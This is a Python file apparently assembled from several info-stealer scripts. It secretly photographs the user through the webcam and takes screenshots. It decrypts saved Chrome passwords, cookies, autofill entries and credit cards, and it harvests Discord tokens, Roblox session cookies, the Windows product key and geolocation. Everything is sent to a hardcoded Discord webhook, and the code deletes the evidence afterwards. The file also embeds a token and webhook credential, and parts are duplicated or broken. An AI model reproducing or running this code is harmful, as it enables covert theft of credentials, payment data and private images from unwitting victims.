import os
import json
import shutil
import base64
import sqlite3
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timezone, timedelta
import requests
import time
import platform
import subprocess
import pyautogui
import os
import tempfile
import asyncio
from discord_webhook import DiscordWebhook
import cv2
import requests
import os
import time
import shutil
import getpass


webhook_url = 'https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp'


appdata_dir = os.path.join(os.getenv('APPDATA'), 'captured_photos')
os.makedirs(appdata_dir, exist_ok=True)


cap = cv2.VideoCapture(0)
ret, frame = cap.read()


current_time = time.strftime('%Y%m%d_%H%M%S')
filename = f'captured_photo_{current_time}.jpg'


filepath = os.path.join(appdata_dir, filename)
cv2.imwrite(filepath, frame)


cap.release()


from requests_toolbelt.multipart.encoder import MultipartEncoder
multipart_data = MultipartEncoder(fields={'file': (filename, open(filepath, 'rb'), 'image/jpeg')})


headers = {'Content-Type': multipart_data.content_type}
response = requests.post(webhook_url, data=multipart_data, headers=headers)


if response.status_code == 200:
    print('Imagen enviada con éxito a Discord.')
else:
    print('Error al enviar la imagen a Discord. Código de estado:', response.status_code)


time.sleep(2)



if len(os.listdir(appdata_dir)) == 0:
    os.rmdir(appdata_dir)




webhook_url = 'https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp'


screenshot = pyautogui.screenshot()
screenshot_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
screenshot.save(screenshot_path)


webhook = DiscordWebhook(url=webhook_url)
with open(screenshot_path, 'rb') as f:
    webhook.add_file(file=f.read(), filename='screenshot.png')
response = webhook.execute()


async def delete_screenshot():
    await asyncio.sleep(5)  
    os.remove(screenshot_path)


asyncio.run(delete_screenshot())



class Chrome:
     def __init__(self):
         self._user_data = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data"
         self._master_key = self._get_master_key()

     def _get_master_key(self):
         with open(self._user_data + "\\Local State", "r") as f:
             local_state = f.read()
             local_state = json.loads(local_state)
             master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
             master_key = master_key[5:]
             master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
             return master_key

     @staticmethod
     def _decrypt(buff, master_key):
         try:
             iv = buff[3:15]
             payload = buff[15:]
             cipher = AES.new(master_key, AES.MODE_GCM, iv)
             decrypted_pass = cipher.decrypt(payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except Exception as e:
             return str(e)

     @staticmethod
     def _convert_time(time):
         epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
         code_stamp = epoch + timedelta(microseconds=time)
         return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')

     def passwords(self):
         try:
             login_db = self._user_data + "\\Default\\Login Data"
             login_db_copy = os.getenv("TEMP") + "\\Login.db"
             shutil.copy2(login_db, login_db_copy)
             conn = sqlite3.connect(login_db_copy)
             cursor = conn.cursor()
             try:
                 cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                 with open("passwords.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         url = item[0]
                         username = item[1]
                         encrypted_password = item[2]
                         decrypted_password = self._decrypt(encrypted_password, self._master_key)
                         f.write(f"URL: {url}\nUSR: {username}\nPDW: {decrypted_password}\n\n")

             except sqlite3.Error:
                 pass

             cursor.close()
             conn.close()
             os.remove(login_db_copy)
         except Exception as e:
             print(f"[!]Error: {e}")

     def cookies(self):
         try:
             cookies_db = self._user_data + "\\Default\\Network\\cookies"
             cookies_db_copy = os.getenv("TEMP") + "\\Cookies.db"
             shutil.copy2(cookies_db, cookies_db_copy)
             conn = sqlite3.connect(cookies_db_copy)
             cursor = conn.cursor()
             try:
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")

                 with open("cookies.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         host = item[0]
                         user = item[1]
                         decrypted_cookie = self._decrypt(item[2], self._master_key)
                         f.write(f"HOST KEY: {host:<30} NAME: {user:<30} VALUE: {decrypted_cookie}\n")

             except sqlite3.Error:
                 pass

             cursor.close()
             conn.close()
             os.remove(cookies_db_copy)
         except Exception as e:
             print(f"[!]Error: {e}")

     def web_data(self):
         try:
             web_data_db = self._user_data + "\\Default\\Web Data"
             web_data_db_copy = os.getenv("TEMP") + "\\Web.db"
             shutil.copy2(web_data_db, web_data_db_copy)
             conn = sqlite3.connect(web_data_db_copy)
             cursor = conn.cursor()

             try:
                 cursor.execute("SELECT name, value FROM autofill")

                 with open("autofill.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         name = item[0]
                         value = item[1]
                         f.write(f"{name}: {value}\n")

                 cursor.execute("SELECT * FROM credit_cards")

                 with open("credit_cards.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         username = item[1]
                         encrypted_password = item[4]
                         decrypted_password = self._decrypt(encrypted_password, self._master_key)
                         expire_mon = item[2]
                         expire_year = item[3]
                         f.write(f"USR: {username}\nPDW: {decrypted_password}\nEXP: {expire_mon}/{expire_year}\n\n")

             except sqlite3.Error:
                 pass

             cursor.close()
             conn.close()
             os.remove(web_data_db_copy)
         except Exception as e:
             print(f"[!]Error: {e}")

     def history(self):
         try:
             history_db = self._user_data + "\\Default\\History"
             history_db_copy = os.getenv("TEMP") + "\\History.db"
             shutil.copy2(history_db, history_db_copy)
             conn = sqlite3.connect(history_db_copy)
             cursor = conn.cursor()

             try:
                 cursor.execute('SELECT term FROM keyword_search_terms')

                 with open("search_history.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         term = item[0]
                         f.write(f"{term}\n")

                 cursor.execute('SELECT title, url, last_visit_time FROM urls')

                 with open("web_history.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         title = item[0]
                         url = item[1]
                         last_time = self._convert_time(item[2])
                         f.write(f"Title: {title}\nUrl: {url}\nLast Time Visit: {last_time}\n\n")

             except sqlite3.Error:
                 pass

             cursor.close()
             conn.close()
             os.remove(history_db_copy)
         except Exception as e:
             print(f"[!]Error: {e}")


def send_webhook_message(webhook_url, message):
     payload = {"content": message}
     response = requests.post(webhook_url, json=payload)
     if response.status_code != 204:
         print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")


def send_files_to_discord(webhook_url, files):
     try:
         for file in files:
             with open(file, "rb") as f:
                 data = {"file": f}
                 response = requests.post(webhook_url, files=data)
                 response.raise_for_status()
         time.sleep(0.5)  # Esperar 10 segundos
         for file in files:
             os.remove(file)  # Eliminar los archivos generados
     except requests.exceptions.RequestException as e:
         print("An Error occurred")


if __name__ == "__main__":
     chrome = Chrome()
     chrome.passwords()
     chrome.cookies()
     chrome.history()
     chrome.web_data()
     files = ["passwords.txt", "cookies.txt", "autofill.txt", "credit_cards.txt", "search_history.txt", "web_history.txt"]
     send_files_to_discord("https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp", files)







sensitive_data = []


system_info = platform.platform()


user_info = platform.node()


network_info = "Network information"


data = {
     "content": f"Sensitive Data: {sensitive_data}\n\n"
                f"System Information: {system_info}\n\n"
                f"User Information: {user_info}\n\n"
                f"Network Information: {network_info}"
 }


webhook_url = "https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp"


response = requests.post(webhook_url, json=data)

if response.status_code != 204:
     print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")







def get_ip_address():
     response = requests.get('https://api.ipify.org?format=json')
     ip_data = response.json()
     return ip_data['ip']


def send_ip_to_discord(webhook_url, ip_address):
     data = {
        'content': f'```IP address is {ip_address}```'
     }
     response = requests.post(webhook_url, json=data)
     if response.status_code == 200:
         print('Checking for updates...')
     else:
         print('Checking for updates...')

webhook_url = 'https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp'


ip_address = get_ip_address()
send_ip_to_discord(webhook_url, ip_address)

webhook = "https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp" # WEBHOOK HERE

from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES 

def safe(func):
     def wrapper(*args, **kwargs):
         try:
             return func(*args, **kwargs)
         except Exception:
             pass
     return wrapper

class CookieLogger:

     appdata = os.getenv('APPDATA')
     localappdata = os.getenv('LOCALAPPDATA')

     def __init__(self):
         browsers = self.findBrowsers()

         cookies = []
         for browser in browsers:
             try:
                 cookies.append(self.getCookie(browser[0], browser[1]))
             except Exception:
                 pass

         try:
             cookies.append(("Roblox App", ("None", '\n'.join(line for line in subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip()))))
         except Exception:
             pass
        
         cookieDoc = ""

         for cookie in cookies:
             if cookie == None or not cookie[1]:
                 continue

             for _cookie in cookie[1]:
                 cookieDoc += f"Browser: {cookie[0]}\nProfile: {_cookie[0]}\nCookie: {_cookie[1]}\n\n"

                 if not cookieDoc: cookieDoc = "No Cookies Found!"
                        
         requests.post(webhook, files = {"cookies.txt": cookieDoc})
    
     @safe
     def findBrowsers(self):
         found = []

         for root in [self.appdata, self.localappdata]:
             for directory in os.listdir(root):
                 try:
                     for _root, _, _ in os.walk(os.path.join(root, directory)):
                         for file in os.listdir(_root):
                             if file == "Local State":
                                 if "Default" in os.listdir(_root):
                                     found.append([_root, True])
                                 elif "Login Data" in os.listdir(_root):
                                     found.append([_root, False])
                                 else:
                                     pass
                 except Exception:
                     pass

         return found

     @safe
     def getMasterKey(self, browserPath):
         with open(os.path.join(browserPath, "Local State"), "r", encoding = "utf8") as f:
             localState = json.loads(f.read())
        
         masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
         truncatedMasterKey = masterKey[5:]

         return CryptUnprotectData(truncatedMasterKey, None, None, None, 0)[1]

     @safe
     def decryptCookie(self, cookie, masterKey):
         iv = cookie[3:15]
         encryptedValue = cookie[15:]

         cipher = AES.new(masterKey, AES.MODE_GCM, iv)
         decryptedValue = cipher.decrypt(encryptedValue)

         return decryptedValue[:-16].decode()

     @safe
     def getCookie(self, browserPath, isProfiled):

         if browserPath.split("\\")[-1] == "User Data":
             browserName = browserPath.split("\\")[-2]
         else:
             browserName = browserPath.split("\\")[-1]
        
         cookiesFound = []

         profiles = ["Default"]
         try:
             masterKey = self.getMasterKey(browserPath)
         except Exception:
             return cookiesFound

         if isProfiled:
             for directory in os.listdir(browserPath):
                 if directory.startswith("Profile"):
                     profiles.append(directory)
        
         if not isProfiled:
             if "Network" in os.listdir(browserPath):
                 cookiePath = os.path.join(browserPath, "Network", "Cookies")
             else:
                 cookiePath = os.path.join(browserPath, "Cookies")
            
             shutil.copy2(cookiePath, "temp.db")
             connection = sqlite3.connect("temp.db")
             cursor = connection.cursor()

             cursor.execute("SELECT encrypted_value FROM cookies")
             for cookie in cursor.fetchall():
                 if cookie[0]:
                     decrypted = self.decryptCookie(cookie[0], masterKey)

                     if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
                         cookiesFound.append(("None", decrypted))
                
             connection.close()
             os.remove("temp.db")
        
         else:
             for profile in profiles:
                 if "Network" in os.listdir(os.path.join(browserPath, profile)):
                     cookiePath = os.path.join(browserPath, profile, "Network", "Cookies")
                 else:
                     cookiePath = os.path.join(browserPath, profile, "Cookies")

                 shutil.copy2(cookiePath, "temp.db")
                 connection = sqlite3.connect("temp.db")
                 cursor = connection.cursor()

                 cursor.execute("SELECT encrypted_value FROM cookies")
                 for cookie in cursor.fetchall():
                     if cookie[0]:
                         decrypted = self.decryptCookie(cookie[0], masterKey)

                         if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
                             cookiesFound.append((profile, decrypted))
                
                 connection.close()
                 os.remove("temp.db")

         return [browserName, cookiesFound]

if __name__ == "__main__":
     CookieLogger()










import psutil
import platform
import json
from datetime import datetime
from time import sleep
import requests
import socket
from requests import get
import os
import re
import requests
import subprocess
from uuid import getnode as get_mac
import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES


from base64 import b64decode, b64encode
from dhooks import Webhook, Embed, File
from subprocess import Popen, PIPE
from json import loads, dumps
from shutil import copyfile
from sys import argv


url= "https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp" 





def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined

uname = platform.uname()

bt = datetime.fromtimestamp(psutil.boot_time()) 

host = socket.gethostname()
localip = socket.gethostbyname(host)

publicip = get('https://api.ipify.org').text # 
city = get(f'https://ipapi.co/{publicip}/city').text
region = get(f'https://ipapi.co/{publicip}/region').text
postal = get(f'https://ipapi.co/{publicip}/postal').text
timezone = get(f'https://ipapi.co/{publicip}/timezone').text
currency = get(f'https://ipapi.co/{publicip}/currency').text
country = get(f'https://ipapi.co/{publicip}/country_name').text
callcode = get(f"https://ipapi.co/{publicip}/country_calling_code").text
vpn = requests.get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
mac = get_mac()


roaming = os.getenv('AppData')

output = open(roaming + "temp.txt", "a")



Directories = {
        'Discord': roaming + '\\Discord',
        'Discord Two': roaming + '\\discord',
        'Discord Canary': roaming + '\\Discordcanary',
        'Discord Canary Two': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
}


## Scan for the regex [\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}
def Yoink(Directory):
	Directory += '\\Local Storage\\leveldb'

	Tokens = []

	for FileName in os.listdir(Directory):
		if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
			continue

		for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for Token in re.findall(regex, line):
					Tokens.append(Token)

	return Tokens


## Wipe the temp file
def Wipe():
    if os.path.exists(roaming + "temp.txt"):
      output2 = open(roaming + "temp.txt", "w")
      output2.write("")
      output2.close()
    else:
      pass


## Search Directorys for Token regex if exists
for Discord, Directory in Directories.items():
	if os.path.exists(Directory):
		Tokens = Yoink(Directory)
	if len(Tokens) > 0:
		for Token in Tokens:
			realshit = f"{Token}\n"


cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()

partitions = psutil.disk_partitions()
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        continue





requests.post(url, data=json.dumps({ "embeds": [ { "title": f"Someone Runs Program! - {host}", "color": 8781568 }, { "color": 7506394, "fields": [ { "name": "GeoLocation", "value": f"Using VPN?: {proxy}\nLocal IP: {localip}\nPublic IP: {publicip}\nMAC Adress: {mac}\n\nCountry: {country} | {callcode} | {timezone}\nregion: {region}\nCity: {city} | {postal}\nCurrency: {currency}\n\n\n\n" } ] }, { "fields": [ { "name": "System Information", "value": f"System: {uname.system}\nNode: {uname.node}\nMachine: {uname.machine}\nProcessor: {uname.processor}\n\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}" } ] }, { "color": 15109662, "fields": [ { "name": "CPU Information", "value": f"Psychical cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\n\nMax Frequency: {cpufreq.max:.2f}Mhz\nMin Frequency: {cpufreq.min:.2f}Mhz\n\nTotal CPU usage: {psutil.cpu_percent()}\n" }, { "name": "Nemory Information", "value": f"Total: {scale(svmem.total)}\nAvailable: {scale(svmem.available)}\nUsed: {scale(svmem.used)}\nPercentage: {svmem.percent}%" }, { "name": "Disk Information", "value": f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}" }, { "name": "Network Information", "value": f"Total Sent: {scale(net_io.bytes_sent)}\")\nTotal Received: {scale(net_io.bytes_recv)}" } ] }, { "color": 7440378, "fields": [ { "name": "Discord information", "value": f"Token: MTExNzc1MzIwODIwNzU4OTQwMA.G5YrCm._VZa_vpuIH-RYBlDLx6o9Yn4F3Rt6EvDc-ucso" } ] } ] }), headers={"Content-Type": "application/json"})

DBP = r'Google\Chrome\User Data\Default\Login Data'
ADP = os.environ['LOCALAPPDATA']


def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None


if __name__ == "__main__":
    main = chrome()
    try:
        main.chromedb()
    except:
        pass
    main.saved()





def beamed():
    hook = Webhook(url)
    try:
        hostname = requests.get("https://api.ipify.org").text
    except:
        pass


    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'
    

    """screenshot victim's desktop"""
    try:
        screenshot = image.grab()
        screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
        screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
        screenshot.close()
    except:
        pass

    """gather our .zip variables"""
    try:
        zname = r'C:\ProgramData\passwords.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write(r'C:\ProgramData\passwords.txt')
        newzip.close()
        passwords = File(r'C:\ProgramData\passwords.zip')
    except:
        pass
    
    """gather our windows product key variables"""
    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    except:
        pass

    """steal victim's .roblosecurity cookie"""
    cookie = [".ROBLOSECURITY"]
    cookies = []
    limit = 2000

    """chrome installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.chrome()))
    except:
        pass

    """firefox installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.firefox()))
    except:
        pass

    """read data => if we find a matching positive for our specified variable 'cookie', send it to our webhook."""
    try:
        for y in cookie:
            send = str([str(x) for x in cookies if y in str(x)])
            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
            for z in chunks:
                roblox = f'```' + f'{z}' + '```'
    except:
        pass

    """attempt to send all recieved data to our specified webhook"""
    try:
        embed = Embed(title='Aditional Features',description='a victim\'s data was extracted, here\'s the details:',color=0x2f3136,timestamp='now')
        embed.add_field("windows key:",f"user => {usr}\ntype => {types}\nkey => {keys}")
        embed.add_field("roblosecurity:",roblox)
        embed.add_field("tokens:",message)
        embed.add_field("hostname:",f"{hostname}")
    except:
        pass
    try:
        hook.send(embed=embed, file=passwords)
    except:
        pass

    """attempt to remove all evidence, allows for victim to stay unaware of data extraction"""
    try:
        subprocess.os.system(r'del C:\ProgramData\passwords.zip')
        subprocess.os.system(r'del C:\ProgramData\passwords.txt')
    except:
        pass

if os.name != "nt":
    exit()
import os
import re
import json
from urllib.request import Request, urlopen
WEBHOOK = 'https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp'
PING_ME = True
def find_tokens(path):
    path += '\Local Storage\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + r'\Discord',
        'Discord Canary': roaming + r'\discordcanary',
        'Discord PTB': roaming + r'\discordptb',
        'Google Chrome': local + r'\Google\Chrome\User Data\Default',
        'Opera': roaming + r'\Opera Software\Opera Stable',
        'Brave': local + r'\BraveSoftware\Brave-Browser\User Data\Default',
        'Yandex': local + r'\Yandex\YandexBrowser\User Data\Default'
    }
    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f' **{platform}** '
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f'```{token}``` '
        else:
            message += 'No tokens found. '
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message})
    try:
        req = Request(WEBHOOK, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
if __name__ == '__main__':
    main()


beamed()

